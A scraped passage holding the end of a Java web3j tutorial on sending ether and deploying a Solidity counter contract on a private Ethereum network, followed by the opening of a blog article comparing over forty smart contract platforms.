org.web3j.protocol.Web3j;import org.web3j.protocol.core.methods.response.TransactionReceipt;import org.web3j.protocol.http.HttpService;import org.web3j.tx.Transfer;import org.web3j.utils.Convert;import java.math.BigDecimal;public class Application {    private static final Logger log = LoggerFactory.getLogger(Application.class);    public static void main(String[] args) throws Exception {        new Application().run();    }    private void run() throws Exception {        // We start by creating a new web3j instance to connect to remote nodes on the network.        Web3j web3j = Web3j.build(new HttpService());        log.info(\"Connected to Ethereum client version: \"                + web3j.web3ClientVersion().send().getWeb3ClientVersion());        Credentials credentials =                WalletUtils.loadCredentials(                        \"supersafepassword\",                        \"chaindata\\\\keystore\\\\UTC--2018--<rest of the file name>\");        log.info(\"Credentials loaded\");        log.info(\"Sending Ether ..\");        TransactionReceipt transferReceipt = Transfer.sendFunds(                web3j, credentials,                \"0xf900D5fEEf974F058543E47B27C801D396684266\",  // you can put any address here                BigDecimal.valueOf(100), Convert.Unit.ETHER)  // 1 wei = 10^-18 Ether                .sendAsync().get();        log.info(\"Transaction complete : \"                + transferReceipt.getTransactionHash());    }}OutputTransfer EtherWrite your first smart contact in solidity languageSmart contract is piece of software developed using Solidity language to perform custom business functionalities. Smart contract will be installed in all nodes in the network. Installation is a one time operation and it has to be submitted as a transaction to the network by spending ether for the miners. Once installed you cannot modify it. It is like a stored procedure in a rational database. You can call functions in the contract by submitting transactions. You can use the Remix browser application to write the smart contract. Remix has an inbuilt ethereum node where you can deploy the contract and test it. Navigate to https://remix.ethereum.org in your browser and write below code.HelloWorld.solpragma solidity ^0.4.16;contract HelloWorld {   uint256 counter = 5;      function add() public {  //increases counter by 1       counter++;   }    function subtract() public { //decreases counter by 1       counter--;   }      function getCounter() public constant returns (uint256) {       return counter;   } }Deploy & test your contract in Remix.Compile your contact using Compile option. Then navigate to Run tab and press Deploy button to deploy it. Your contract will be deployed as a Transaction. Therefore you need to specify the source account address and a Gas limit (amount of ether paid for miners for the execution of this transaction). Once deployed contract will have its own address. This address can be used to call methods in the transaction.Deployed contractYou can execute functions in the contract by pressing add, subtract and getCounter buttons. Press the add button and then press the getCounter button to check the value of your counter.Execute the\u00a0contractNow we will be deploying the contract using web3j instead of Remix. First we need to compile the contract. The compiled output of the Smart Contract has two parts. The binary file ( which will be executed in ethereum JVM once deployed) and the application binary interface (ABI) which is a human readable definition of the contract represented in JSON format. These output is required to generate the wrapper class uisng web3j. The wrapper class will hide all the complexities of connecting & executing your smart contract. It will act as an interface for the smart contract.Compile ContractCompile the contactWe will be using solc compiler to compile the contract. You can download the windows version of it.https://github.com/ethereum/solidity/releasesSolidity: Using solc on Windows \u00b7 Code OozeThe solc command line compiler is a C++ implementation of the Solidity compiler that can output opcodes for\u2026www.codeooze.comsolc compilerDownload and extract the zip file into your hard disk. Then save your contract to a file called HelloWorld.sol and save it to solc compile folder for easy access.solc fileOpen new terminal and use below command to compile it.https://web3j.readthedocs.io/en/latest/smart_contracts.htmlsolc HelloWorld.solc --bin --abi --optimize -o ./This command will generate binary file and ABI file as the output.Compiled output of the\u00a0contractLets use the output of the compiled smart contract to generate the HelloWorld.java wrapper class. This wrapper class is used to interact with the Smart Contract. All complexities will be hidden from the end user.Generate Wrapper\u00a0classInteract with the Smart\u00a0Contractweb3j comes with a command line utility to generate the wrapper class. where you can download it from below location. Once the tool is copied to your hard disk, you need to copy the binary file and ABI generated in above step to the same folder where the web3j.bat file is present.web3j/web3jweb3j - Lightweight Java and Android library for integration with Ethereum clientsgithub.comweb3jExtract the folder into your hard disk. Copy abi file and binary file created in above solidity compilation step into bin folder.Generate Wrapper\u00a0classRun below command to generate the wrapper class.web3j solidity generate helloworld.bin helloworld.abi -o . -p org.web3j.sampleParameter p should be the java packaging structure for the generated class.Hint\u00a0: https://stackoverflow.com/questions/44662197/web3j-solidity-generate-command-not-workingNew class will be generated in org.web3j.sample folder.Part of the generated HelloWorld.javaCopy this file to your application folder structure.Application package structureLets deploy and use Smart Contract from our your application.Deploy and use smart\u00a0contractComplete codepackage org.web3j.sample;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.web3j.crypto.Credentials;import org.web3j.crypto.WalletUtils;import org.web3j.protocol.Web3j;import org.web3j.protocol.core.methods.response.TransactionReceipt;import org.web3j.protocol.http.HttpService;import org.web3j.tx.Contract;import org.web3j.tx.ManagedTransaction;import org.web3j.tx.Transfer;import org.web3j.utils.Convert;import java.math.BigDecimal;public class Application {    private static final Logger log = LoggerFactory.getLogger(Application.class);    public static void main(String[] args) throws Exception {        new Application().run();    }    private void run() throws Exception {        // We start by creating a new web3j instance to connect to remote nodes on the network.        Web3j web3j = Web3j.build(new HttpService());        log.info(\"Connected to Ethereum client version: \"                + web3j.web3ClientVersion().send().getWeb3ClientVersion());        Credentials credentials =                WalletUtils.loadCredentials(                        \"password\",                        \"chaindata\\\\keystore\\\\UTC--2018-06-21T06-34-32.658490800Z--5ade9a7f8f57ab3995ac4d56c78a22649d3b1686\");        log.info(\"Credentials loaded\");        log.info(\"Sending Ether ..\");        TransactionReceipt transferReceipt = Transfer.sendFunds(                web3j, credentials,                \"0xDc1Fb60F7E1eF6ef052A014EFbDF82debd803D06\",  // you can put any address here                BigDecimal.valueOf(100), Convert.Unit.ETHER)  // 1 wei = 10^-18 Ether                .sendAsync().get();        log.info(\"Transaction complete : \"                + transferReceipt.getTransactionHash());        // Now lets deploy a smart contract        log.info(\"Deploying smart contract\");        Helloworld contract = Helloworld.deploy(                web3j, credentials,                ManagedTransaction.GAS_PRICE, Contract.GAS_LIMIT).send();        String contractAddress = contract.getContractAddress();        log.info(\"Smart contract deployed to address \" + contractAddress);        log.info(\"Initial value of counter in Smart contract: \" + contract.getCounter().send());        log.info(\"Incrementing counter in Smart contract\");        contract.add().send();        log.info(\"Value of counter in Smart contract after increment : \" + contract.getCounter().send());        log.info(\"Decrementing counter in Smart contract\");        contract.subtract().send();        log.info(\"Final value of counter in Smart contract : \" + contract.getCounter().send());    }}OutputOutputWoooow!!, It is working\u00a0\u2026.Application of Blockchain technology\u00a0: Blockchain technology can be used not only for Cryptocurrencies. The primary building blocks of blockchain technology can be used in enterprise applications such as immutability, anonymity & security. For an example a land registration system can be easily build using Smart Contracts in Ethereum. Any application built using blockchain will leverage one or more capabilities of blockchain.Conclusionweb3j is an effective method of interfacing with Ethereum blockchain using Java language.I just started writing my next article in creating your own Currency (Token) using smart contract. It will cover all steps needed to publish your currency in private network and use it for transactions.As promised my article on creating you own currency token has been released.https://medium.com/coinmonks/create-your-own-cryptocurrency-in-ethereum-blockchain-40865db8a29fI am planning to an article on initial coin offering as well. This is called Crowdsale. Hope to see you soon.I\u2019ll will be sharing more articles on future so don\u2019t forget to follow, clap and comment. Thanks for\u00a0reading.Please feel free to contact me on:Email\u00a0: email.thusharaj[at]gmail.comLinkedin\u00a0: https://www.linkedin.com/in/thusharaj/References: Special Thanx to Stepen Gridder\u00a0: Udemy.com for his wonderful materials on Ethereum. I have reused some of his original work in my article.https://skillsmatter.com/skillscasts/11141-java-and-the-blockchain-building-java-applications-on-ethereum-with-web3j-3-0https://www.ccn.com/bitcoin-transaction-really-works/https://codeburst.io/build-your-first-ethereum-smart-contract-with-solidity-tutorial-94171d6b1c4bhttps://www.youtube.com/watch?v=UmCEdcRjaz0&pbjreload=10https://www.youtube.com/watch?v=1fKnjMGmB2Uhttps://medium.com/@mvmurthy/full-stack-hello-world-voting-ethereum-dapp-tutorial-part-1-40d2d0d807c2https://medium.com/taipei-ethereum-meetup/beginners-guide-to-ethereum-2-run-multiple-nodes-on-a-private-network-in-5-lines-c97a4d78a590https://hackernoon.com/setup-your-own-private-proof-of-authority-ethereum-network-with-geth-9a0a3750cda8https://arvanaghi.com/blog/how-to-set-up-a-private-ethereum-blockchain-using-geth/https://blog.zeppelin.solutions/designing-the-architecture-for-your-ethereum-application-9cec086f8317https://medium.com/@merunasgrincalaitis/the-ultimate-end-to-end-tutorial-to-create-and-deploy-a-fully-descentralized-dapp-in-ethereum-18f0cf6d7e0ehttps://www.codeooze.com/blockchain/solc-hello-world/", "responses": "14"}, {"title": "ContractPedia: An Encyclopedia of 40+ Smart Contract Platforms", "author_name": "vasa", "link": "https://hackernoon.com/contractpedia-an-encyclopedia-of-40-smart-contract-platforms-4867f66da1e5?source=search_post", "post_date": "Jul 18, 2018", "readtime": "52 min read", "upvotes": "1.4K", "content": "ContractPedia: An Encyclopedia of 40+ Smart Contract PlatformsA Complete Comparision of all Blockchain/DLT PlatformsvasaBlockedUnblockFollowFollowingJul 18, 2018Code Is Law\u00a0(source)The blockchain is changing the world as we know it today.It solves one of the greatest problems know to the mankind: it removes the need of trust. The way blockchain solves it by creating an unalterable trail of anything that needs trust to operate.But there is lot of power within this technology.The power to extend the above property to create rules that need to be followed as written, where every action leads to some reaction. In other words, smart contracts.Today we are going to list 40(and growing) platforms/projects that support/develop smart contracts. If you find anything missing or wrong here then shoot that in the comments. Also, the article will be updated regularly as I study more about these platforms and projects.Here is the Github link to the repository for this article. You can create a pull request for suggesting changes to this article.P.S. The purpose of the article is to evaluate the platforms/projects on the basis of the factors that will affect their smart contract functionality, not their overall features.Articles like this usually take days to complete. If you like reading this type of content and keep this effort continuing then you can show your appreciation and support by buying me a coffee by donating here or to below ETH address:               a93e64a691d5aff8f78cd63130cf23b89182d235Here is a list of 40 smart contract platforms/projects.1. EthereumPros:Turing CompleteEnjoys probably the biggest community of developersMost supported smart contract platformCons:Uses solidity, which is not as powerful as compared to today\u2019s languages such as C++, C#, python, go etc.Can prove to be costly if the contract is not written efficiently.Smart Contract Language: SolidityStatus: LiveExplanation: Ethereum is one of the first platforms to introduce the concept of smart contracts in the blockchain, and enjoys the support of biggest developer community. It boasts turing completeness of its smart contract platform. The contract code is executed on the EVM(Ethereum Virtual Machine) by every miner in the ethereum network. It is the most used platform used for blockchain based projects.The platform is a safe bet, but it is blamed for a lot of hacks which has cost its users millions. Also lack of scalablity of the platform results in low transaction speed; making it unsuitable for today's real-world applications.The language used(Solidity) is good enough to make it turing complete but it does lacks in the flexibility which is provided by the languages used today. Some problems like:Not supporting multi-dimensional arrays(eg. string array) in input parameters and return parameters(Here is a workaround)Only allowing a small number parameters(only 16) in a contract function. (Causing \u201cstack too deep\u201d error)The above problems show that the contract language still needs to be developed more to match the flexibility of today\u2019s languages.Here is a list of 62 issues of solidity.Learning Resources: CryptoZombies, Solidity Docs, OpenZeppelin, ethereum2. QuorumPros:Turing CompleteAdds a feature of sending private transactions between 2 or more parties in the network(by use of constellation) which makes it suitable for enterprisesIt reduces gas-price to zero, still keeping the gas-limit, thus enjoying the security features provided by use of gas-limit and simultaneously making the transaction cost(gas-price*gas-limit) 0.Cons:Relatively small developer communitySame cons as suffered by ethereum due to Solidity as its smart contract languageSmart Contract Language: SolidityStatus: LiveExplanation: In simple wordsIt is version of Ethereum smart contract platform which provides free-of-cost transactions and is also capable of executing private transactions between selected parties using constellation.Constellation: Under the hoodIt maintains 2 ledgers: public and private. Public ledger is altered by public transactions and private ledger is altered(only for the parties involved in the the private transactions) by private transactions.Quorum ArchitectureAs it is closely related to ethereum(same core platform and language), it inherits almost all of the ethereum\u2019s pros and cons as a smart contract platform.Learning Resources: Quorum Docs, CryptoZombies, Solidity Docs, OpenZeppelin3. WanchainPros:Adds user privacy in addition to normal ethereum smart contract platform featuresIs capable of cross-chain transactionsCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: It is a fork of Ethereum, thus it inherits a lot of properties of Ethereum. In addition it provides user privacy. Their main focus is on digitizing the current financial model of world on blockchain.Wanchain\u2019s privacy is achieved through the use of ring signatures, which provide complete anonymity to the signer of a transaction while also providing the receiver with the ability to verify the sender\u2019s signature. Additionally, Wanchain offers the option for One Time Addresses (OTA) to provide further anonymity optionality.Wanchain ArchitectureWanchain\u2019s distributed ledger builds upon the strengths of Ethereum, and any Ethereum DApp will run on Wanchain without any code alteration. To enhance these applications, Wanchain offers a number of APIs designed to expand cross-chain capabilities and improve privacy protection.Learning Resources: Smart contracts on Wanchain, Wanchain token, CryptoZombies, Solidity Docs, OpenZeppelin, Oliver Birch4. AeternityPros:Introduced new smart contract language and VMs for faster and safer code execution.Using State channels and efficient ways to execute contracts keep the transaction prices low.By providing a version of the EVM it is easy to migrate EVM contracts to \u00c6ternity.Smart Contract Language: Sophia, Solidity, VarnaStatus: LiveExplanation: The overreaching functional goal of \u00c6ternity smart contracts is to be able to execute code on the chain. That is, code execution that is verified by a miner and which can alter the state of the chain.The design and implementation of the \u00c6ternity smart contracts also have the following non-functional goals in the following order:Contract execution should be safe.Contract execution should be efficient and scale.Contract execution should be cheap.There should be a simple way to migrate from Ethereum smart contracts.Goal 1: Contract execution should be\u00a0safeWith safe contracts we mean that you can specify and automatically prove properties of your contract.In order to achieve this we have designed a new functional language Sophia and a new safe virtual machine FTWVM.Goal 2: Contract execution should be efficient and\u00a0scaleIn order to achieve a scalable solution \u00c6ternity provides State Channels and a new consensus algorithm.To get efficient contract execution \u00c6ternity provides a very high level language for blindingly fast execution of simple contracts. For more advanced contract the Sophia language can be used. Sophia is compiled to a virtual machine that is tailored for the execution of Sophia contracts. This machine is also high level machine with instructions for operating on the chain and on Sophia data structures without the need to do explicit stack and memory management.It also uses high-level smart contract language called Varna which is similar to Bitcoin\u2019s Script language, but with no loops and a fixed gas price. It uses its own virtual machine\u200a\u2014\u200athe HLM (High Level Machine) and its code is directly evaluated by the node software. Varna is designed to cover fast, day-to-day contracts.Goal 3: Contract execution should be\u00a0cheapThe price of contract execution will ultimately be determined by miners and users, but by providing State channels, efficient ways to execute contracts, and a simple flat rate high level contract language prices should be kept low.Goal 4. There should be a simple way to migrate from Ethereum smart contractsBy providing a version of the EVM it is easy to migrate EVM contracts to \u00c6ternity.Learning Resources: Smart contract docs, Sophia docs, Sophia Intro, \u00e6ternity5. ZenPros:Total(see below for explaination)As the smart contract language is \u201cDependently Typed\u201d, thus it is less prone to errors and is expressive enough to use it for \u2018Formal Verification\u2019(see below)Smart Contract Language: F*Status: LiveExplanation: Zen Protocol has a very different way of doing smart contracts to other projects.Zen: I\u2019m differentWe\u2019ll start by defining what smart contracts are. In the most abstract sense, a smart contract is a computer program that is designed to run in a decentralized environment\u200a\u2014\u200athat is, the program is run to determine the consensus of a blockchain. In Bitcoin, smart contracts in the form of Bitcoin Scripts determine whether a transaction is valid or not. In Ethereum, smart contracts in the form of EVM bytecode alter the state of the EVM.Bitcoin Script is limited in that it is not \u2018Turing Complete\u2019\u200a\u2014\u200ait is not possible to express arbitrary computer programs. If we want to express arbitrary logic in smart contracts, then we must be able to have that arbitrary logic evaluated to determine consensus. Turing Complete languages are capable of expressing programs that do not \u2018halt\u2019\u200a\u2014\u200athat is, they do not ever finish executing\u200a\u2014\u200aand it\u2019s not possible in general to know if a program finishes terminating, or how long it might take to terminate, or how much computational resources are needed in order to execute the program. Because we don\u2019t know how much resources will be needed to execute a program, we can\u2019t have Turing Complete languages determine consensus\u200a\u2014\u200aa program might not halt, meaning that consensus cannot be determined.Ethereum\u2019s EVM is much more expressive than Bitcoin Script. The EVM associates a \u201cGas Cost\u201d to each EVM bytecode instruction. A user pays a certain amount of \u201cGas\u201d, and the EVM begins to evaluate a smart contract\u2019s instructions; It evaluates the gas cost of an instruction, and if there is enough gas to continue, it subtracts the gas cost from the gas that the user has paid for, evaluates the instruction, and continues, failing if it runs out of gas before the execution of it\u2019s instructions is complete. In this manner, it\u2019s possible to express almost arbitrary computation\u200a\u2014\u200aEthereum smart contracts are only limited in that they must terminate eventually, because the user cannot pay infinite gas in order to perform infinitely looping computations. In practice, we are rarely interested in programs that do not terminate, so this restriction is fine.The EVM\u2019s process of interpreting bytecode instructions and tracking gas is very inefficient. For each instruction, the EVM must look up it\u2019s gas cost, check that there is enough gas remaining, and subtract the gas cost from the gas remaining. It is difficult to perform optimisations to improve run time with this kind of evaluation model.The restriction that all smart contracts in Ethereum must be terminating is of interest. Languages in which every program must terminate are not actually Turing Complete\u200a\u2014\u200athey are \u2018Total\u2019. Zen uses a total language to express it\u2019s smart contracts, rather than relying on an evaluation model that tracks gas in order to ensure totality. Total languages are absolutely capable of expressing arbitrary logic like loops and recursion, and this is the case for Zen Protocol as well.Zen\u2019s smart contracting language is \u2018Dependently Typed\u2019, meaning that every expression has a type, and types may depend on both expressions and types. Dependent type systems are expressive enough to use them for \u2018Formal Verification\u2019\u200a\u2014\u200athese types can express arbitrary properties of expressions. For example, whilst in a simply typed language one could give the number 3 the type \u201cInteger\u201d, in a dependently typed language, one could also give it the type of \u201cPrime Integer\u201d, or \u201cInteger that is less than 10\u201d. Dependently typed languages can express resource consumption of programs, which is explained in this blog post.A typed language will fail to compile if the types are incorrect, and a dependently typed language is no different. A program that expresses incorrect resource consumption or incorrect assertions will fail to compile.Zen Protocol\u2019s smart contract paradigm takes advantage of this. It takes dependently typed source code, which must express it\u2019s resource consumption. If this code compiles successfully, then it\u2019s guarantee about resource consumption must be correct, and since we use a total language, we know that it will terminate. Since we know the resource costs from the code itself, we don\u2019t need to interpret bytecode instructions and count gas consumption as we go; we know the cost before we run the code. This gives us all of the efficiency benefits of compiled code, as opposed to interpreted code. We currently extract to F#, and compile the F# to CIL bytecode, which we later execute\u200a\u2014\u200abut it would be possible for other implementations of the Zen Protocol to do this differently, extracting to OCaml or C, for example.This compilation step only happens once; once code is compiled, it can be executed several times with a huge increase in efficiency.To lay out the process clearly: A user submits their smart contract source code in a transaction. A node then compiles the code, extracting from it both the program and an expression for it\u2019s resource cost. The node can then execute this contract much faster than a node can execute interpreted code. The source code itself is part of consensus; the compiled binaries are not, and only exist locally for the node. Contracts have a delay between being submitted and being \u201cactive\u201d, allowing nodes to compile contracts in parallel after they receive them, so that they are available for use in a few blocks, but their compilation does not affect transaction throughput.Smart contracts in Zen are not just faster to run, but can also be executed in parallel most of the\u00a0time.Zen Protocol is less limited by the time taken to run smart contracts, and should be able to process transactions involving smart contracts faster\u200a\u2014\u200asmart contracts in Zen are not just faster to run, but can also be executed in parallel most of the time.Zen Protocol does not maintain a full virtual machine like the EVM as part of consensus\u200a\u2014\u200acontracts are separate from other contracts. This enables us to execute contracts in parallel, as opposed to the single-threaded execution of the EVM. This is also a huge efficiency gain, since modern hardware is capable of high degrees of parallelism. Since our contracts are stateless and functionally pure, there are no race conditions or any barriers to parallel execution. Multiple transactions involving the same smart contract may not be easily parallelised, and may have to be executed in series; however since we are running efficient, compiled code, this is still faster than running equivalent computations on the EVM.Learning Resources: Zen Medium, Zen Docs, Asher Manning6. CounterpartyPros:Ethereum smart contracts on top of Bitcoin network(used for consensus).Cons:Same as for EthereumSmart Contract Language: Solidity, SerpentStatus: LiveExplanation: Counterparty relies on Bitcoin for its consensus. But it also supports ethereum smart contracts.Counterparty: Bitcoin with EthereumHere is how it works on a higher level:You write the smart contract code (using Solidity or Serpent) and compile it to a more compact form (bytecode).Counterparty will create and broadcast a publish transaction to embed this contract code into the Bitcoin blockchain. This is done in a way that is spendable and doesn\u2019t \u201cpollute\u201d the blockchain.Once published, the smart contract \u201clives\u201d at an address, which looks like a regular Bitcoin address, but starts with a C\u00a0.You can then use Counterparty to create and broadcast an executetransaction to call a specific function or method in the smart contract code.Once an execution transaction is broadcast and confirmed by a Bitcoin miner, every running Counterparty node will receive this request, and execute that method. As the smart contract code executes, it modifies the contract state, which is stored in the Counterparty database. Since each Counterparty node has the same contract code (guaranteed by Bitcoin) as well as the same EVM code, and the code is all deterministic, these state changes are the same for every node.Others can also send Counterparty assets to the smart contract, which will store them and can use them in future execute calls. This is useful for things like funding contracts, for instance.Essentially, we see that the publishing of smart contracts and the command to kick off the execution of a specific function or method in a contract are made as actual transactions on the Bitcoin blockchain. Thus, these two operations are limited by Bitcoin\u2019s ~10 minute blocktimes. However, once an execution of smart contract code is kicked off, it generally runs as fast as the node can process it.How does Bitcoin\u2019s 10 minute block time affect the\u00a0EVM?After a contract is written, it is \u201cpublished\u201d to the blockchain, which embeds its data in the blockchain, ensuring that all Counterparty nodes have the same contract code to execute. Once published, a method/function on a contract may then be executed.Both the publishing operation, as well as any execution operations, are published as a Counterparty transaction (inside a Bitcoin transaction) and thus subject to the block time. However, once a contract executes, it will move from line of code to line of code as quickly as the host computer allows, and individual \u201csteps\u201d within a contract are not subject to block times. Nor is a contract executing another contract (via CALL) subject to the block times, and the called contract method (as well as any methods that it calls, and so on) execute immediately.Thus, the block time limit is overall rather minor, and only affects the initial publishing and the initial execution of a contract method.Here is an extensive resource which will answer all your doubts about Counterparty.Learning Resources: CounterParty smart contract docs7. Rootstock (RSK)Pros:Enables Turing complete smart contracts on top on Bitcoin.Smart Contract Language: SolidityStatus: LiveExplanation: Rootstock (RSK) is a smart-contract platform that incorporates a Turing Complete Virtual Machine to Bitcoin. It also provides other network enhancements, such as faster transactions and better scalability, features which could also enable new usage scenarios.RSK is the first open-source smart contract platform with a 2-way peg to Bitcoin that also rewards the Bitcoin miners via merge-mining, allowing them to actively participate in the Smart Contract revolution. RSK goal is to add value and functionality to the Bitcoin ecosystem by enabling smart-contracts, near instant payments and higher-scalability.Learning Resources: Rootstock8. RChainPros:Turing CompleteSmart contracts enjoy a number of industry-leading functions such as: Meta-programming, Reactive Data Streams, Pattern Matching. As a result, RChain contracts have programmability.Smart Contract Language: RHOLangExplanation: RChain is a project which focuses on scalability by using a multi-threaded blockchain with its own smart contract language. It wants to compete with top projects like Ethereum.RChain is built up following a couple of minimal requirements:Dynamic smart contract functionality to allow more use cases to be implemented.Concurrent execution; Multiple independent smart contracts can operate next to each other.Computationally non-intensive consensus protocol in order not to waste resources: Casper Protocol.The Java Virtual Machine (JVM) is the foundation of Rho Virtual Machine (RVM). The RVM Execution Environment can operate multiple RVMs with each running a smart contract concurrently and in a multi-threaded fashion. The concurrent structure allows for independent processes to compose into complex processes without competing for resources. This architecture will enable a multi-chain (multiple blockchains per node) effect where transactions are handled on independently executing VM instances.Rholang ContractsRholang contracts can be used on RChain nodes. Rholang is \u201cprocess-oriented\u201d: all computation is done by means of message passing. Messages are passed via \u201cchannels\u201d, which are rather like message queues. Note that throughout this article the words \u201cname\u201d and \u201cchannel\u201d are used interchangeably. This is because in the rho-calculus (on which Rholang is based) the term name is used, however, because you can send and receive information on names, semantically they are like channels. You can play around with some code using the Rholang web interface.RChain has recreated ERC20 functionality for Rholang. It\u2019s now possible to create your token smart contract and deploy it on RChain. You can find the example on their Github.Learning Resources: RCHain developer site, RHOLang Tutorial, RChain9. QtumPros:Serves as an improvement upon Ethereum smart contract platform: scalability, lack of formal verification tooling, and lack of lite mobile solutions using simple payment verification (SPV).Cons:By being fully EVM compatible and supporting Solidity contracts Qtum inherits all of Ethereum\u2019s smart contract security weaknesses.Smart Contract Language: SolidityStatus: LiveExplanation: Qtum is a smart contracts platform designed to be Ethereum-compatible while addressing some perceived deficiencies of Ethereum such as scalability, lack of formal verification tooling, and lack of lite mobile solutions using simple payment verification (SPV). Qtum addresses these issues with a different underlying blockchain and consensus algorithm that Qtum believes will enable the platform to provide better support for lightweight mobile and Internet of Things (IoT) applications. The project aspires to become the \u201cpublic blockchain for business\u201d by bringing its technology to financial services, supply chain management, social media, gaming, and other industries in the future.Qtum is essentially an Ethereum-based smart contracts system running on top of a Bitcoin-based blockchain using a modified version Blackcoin\u2019s Proof of Stake (PoS) implementation for consensus. Qtum has added a custom adaptation layer that maps Ethereum account balances to sets of Bitcoin Unspent Transaction Outputs (UTXOs).By being fully EVM compatible and supporting Solidity contracts Qtum inherits all of Ethereum\u2019s smart contract security weaknesses.Qtum does plan to extend their smart contracts offering to include an x86 virtual machine that would enable the development of smart contracts in languages such as C++, Java, and Haskell. While this would allow Qtum projects to tap into a wider base of developers and leverage existing tooling, it doesn\u2019t specifically address the security issues inherent to Solidity\u2019s design.The Qtum white paper states that it is Qtum\u2019s objective to develop a Qtum Smart-Contract Language (QSCL) that is claimed to be \u201cbacked by formal verification means.\u201d No details are provided other than a reference to an academic paper from one of the white paper authors describing another language, developed by that same author, defining a \u201ccross-organizational collaboration ontology.\u201d Given the lack of information available about QSCL, it appears that Qtum has not and is not pursuing this initiative.Learning Resources: Smart contract development Guide, Qtum10. ArkSmart Contract Language: To be decidedStatus: Not LiveExplanation: Ark attempts to create a smart contract platform similar to ethereum. The ARK Virtual Machine integration will allow users to issue ARK Smart Contracts. The only difference is that Ark uses dPoS as its consensus mechanism, which makes its transactions faster.Learning Resources: ACES Ark to Ethereum Smart Contract service, BoldNinja11. EOSPros:Faster contract execution using WASM.Zero fee transactions.Uses C++ as smart contract language, which increases programming flexibility.Cons:Still needs a lot of community support to \u201ckill\u201d Ethereum(no offence).Smart Contract Language: C++, CStatus: LiveExplanation: EOS.IO contracts (aka applications) are deployed to a blockchain as pre-compiled Web Assembly (aka WASM). WASM is compiled from C/C++ using LLVM and clang, which means that you will require knowledge of C/C++ in order to develop your blockchain applications. While it is possible to develop in C, it is recommend to use the EOS.IO C++ API which provides much stronger type safety and is generally easier to read.Application StructureEOS.IO applications are designed around event (aka action) handlers that respond to user actions. For example, a user might transfer tokens to another user. This event can be processed and potentially rejected by the sender, the receiver, and the currency application itself. As an application developer you get to decide what actions users can take and which handlers may or must be called in response to those events.Transactions are fast as it uses dPoS as its consensus mechanism, parallel execution, partial evaluation and other optimizations. It is considered as a good competitor to Ethereum due to its high scalability, zero transaction fee, C++ as smart contract language; but it still lacks in wide adoption which will show the actual pros and cons as a smart contract platform.Learning Resources: EOS developer docs, eosio12. NeoPros:Supports efficient and cheap(computationally) execution of contracts.Cons:Small developer community.Smart Contract Language: C#, VB.Net, F#, Java, Kotlin, Python; they plan to support C, C++, Golang, JavascriptStatus: LiveExplanation: The NEO Smart Contract 2.0 includes the following features: certainty, high performance, and expandability. The contract types include: validation contracts, function contracts, and application contracts.From the performance point of view, NEO uses the lightweight NeoVM (NEO Virtual Machine) as its intelligent contract execution environment. It starts very fast and takes up a small amount of resources and is suitable for smart contracts such as short procedures. Static compilation and caching of hotspot contracts can be significantly enhanced by JIT (real-time compiler) technology. The instructional setup of the NEO virtual machine provides a series of cryptographic instructions to optimize the execution efficiency of cryptographic algorithms in smart contracts. In addition, data manipulation instructions provide support for arrays and complex data structures directly. All of the above will enhance performance in NEO Smart Contract 2.0.NEO Smart Contract 2.0 achieves a scalable approach through a combination of high concurrency and dynamic partitioning, combined with its low-coupling design. The low coupling contract procedure is executed in a virtual machine (NEO virtual machine) and communicates with the outside through the interactive service layer. Therefore, the vast majority of upgrades to the smart contract function can be achieved through API of the interactive service layer.From the language point of view, the difference between NEO Smart Contract 2.0 and Ethereum is more intuitive: unlike the original Solidity language in Ethereum, the NEO smart contract can be used directly by almost any high-level programming language. The first supported languages \u200b\u200bare C#, VB.Net, F#, Java, and Kotlin. NEO provides compilers and plug-ins for these languages, which are used to compile high-level languages \u200b\u200binto instruction sets supported by NEO virtual machines. The first compiler is for MSIL (Microsoft intermediate language), so theoretically any\u00a0.Net language and any language that can be translated into MSIL will be immediately supported.Spite of all this there is no widespread adoption.Learning Resources: Neo smart contracts Docs, NEO13. NXTStatus: LiveExplanation: Nxt smart contracts are not Turing complete, but have used a Turing complete scripting layer to create template smart contracts. Users would select the most appropriate template and adjust the parameters to create their own smart contracts. Nxt believes the smart contracts created from these templates should cover most business applications; be easy to code, and ensure safety in the system.Learning Resources: Nxt smart contracts14. NemPros:Fast and scalableCons:A bit centralized and less transparent(see explanation)Smart Contract Language: No specific languageStatus: LiveExplanation: Scalability is the most critical thing about NEM\u2019s decentralized application. While ETH does a maximum of 15 transactions per second, NEM reportedly manages hundreds of transactions per second. The NEM foundation has given security and availability a priority.NEM\u2019s blockchain exposes its functionality through a powerful API interface that can be used with any programming language, not a specific \u201csmart contract\u201d language. What Nem cleverly calls \u201coff-chain contracts\u201d is just code using the NEM API. The person running the code can update that at any time, at will without any interaction with the chain. So existing \u201ccontracts\u201d can be changed. Depending on what the code does it may be more or less seamless. You can\u2019t change something that that piece of code has done on the chain (say reverse transactions) but you can change that piece of code to do something else from now on without interacting with the chain. So in a sense what NEM is doing is less decentralized and transparent but scales a lot better (at least for now) and is a lot more easy to get things done with.Learning Resources: Nem smart contracts, NEM Official (Editors)15. WavesSmart Contract Language: RIDEONStatus: LiveExplanation: Waves has taken a carefully-considered approach to the implementation of smart contracts. The rollout of the long-anticipated Waves smart-contracts is divided into two stages. The first one is already coming\u200a\u2014\u200anon-Turing complete smart contracts were launched on 28 April on testnet. The initial release will allow the community to test non-Turing complete contracts, which will enable various account controls and other functionality. Only when these features have been thoroughly tested and activated on mainnet will fully Turing complete contracts follow.Non-Turing complete smart contracts will cover the majority of the common use cases. It will be a universal and handy tool for implementing any business tasks you potentially might need\u200a\u2014\u200afrom exchanging tokens hosted on different blockchains to establishing precise mechanisms and terms for controlling a shared budget for your project or enterprise. Besides that, non-Turing complete smart contracts are fully secure: the user simply won\u2019t be able to make mistake, so the contract will never be fulfilled incorrectly.One of the first and likely most immediately popular use cases for Waves smart contracts will be multisignature accounts. Another useful application will be token freezing. This involves sending a token to a user, but ensuring it remains non-transferable and unspendable for a period of time. The most obvious use case for this is as a vesting mechanism or for team/contractor payments after an ICO takes place.A further application of account controls is balance management. A user might want to make regular monthly payments, but to ensure that their account does not fall below a certain balance. Or they might want to keep a fixed amount of funds in one address and move everything above that to a separate account.Learning Resources: Waves smart contract docs, smart contract IDE, Waves Platform16. StratisPros:Uses widely used\u00a0.NET framework.It uses the full tried and tested C# package supplied by Microsoft.Smart Contract Language: C#Status: LiveExplanation: The most important aspect of the implementation of Stratis smart contracts is they use \u201creal\u201d\u00a0.NET, which is to say\u00a0.NET Core is used to execute them. The Stratis Full Node is also written in C# and the route of execution for both it and and a Stratis smart contract is the same. Stratis smart contracts are not 